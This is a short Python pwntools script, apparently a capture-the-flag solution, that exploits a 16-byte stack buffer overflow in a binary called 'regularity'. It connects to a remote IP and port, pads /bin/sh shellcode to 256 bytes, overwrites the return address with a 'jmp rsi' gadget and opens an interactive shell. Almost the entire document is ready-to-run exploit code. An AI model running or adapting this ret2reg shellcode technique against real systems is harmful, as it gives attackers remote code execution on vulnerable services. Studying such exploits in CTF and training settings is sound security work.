### ret2reg vuln

### read() reads 272 bytes into a 256-byte buffer, 16 byte overflow

### Input location is pointed by RSI, fill the buffer and jump to RSI at return address

from pwn import *

elf = context.binary = ELF('./regularity', checksec=False)
context.log_level = 'debug'

io = remote('94.237.54.192', 44214)

offset = 256

jmp_rsi = next(elf.search(asm('jmp rsi')))

shellcode = asm(shellcraft.sh())

payload = flat(
	shellcode.ljust(offset, b'A'),
	jmp_rsi
)

io.sendline(payload)
io.interactive()